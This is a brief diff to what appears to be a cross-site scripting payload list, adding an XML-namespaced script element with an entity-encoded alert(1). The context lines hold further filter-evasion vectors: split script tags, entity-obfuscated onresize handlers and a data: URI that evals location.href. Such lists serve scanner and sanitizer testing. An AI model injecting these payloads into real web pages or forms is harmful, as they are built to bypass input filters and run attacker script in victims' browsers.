@@ -1226,3 +1226,5 @@ data:html=1;alert(1)/*,<body%20onload=eval(location.href)><title>*/;alert(2)}
 </script/x><scr<script>ipt>alert(1)</script/x>
 <%/%=%&#62<&#112/&#111&#110&#114&#101&#115&#105&#122&#101=&#97&#108&#101&#114&#116(1)//>
 <%/%=%><p/onresize=alert(1)//>
+<?xml version="1.0" encoding="utf-8" ?><x:script
+xmlns:x="http://www.w3.org/1999/xhtml ">alert(1&#00000041;
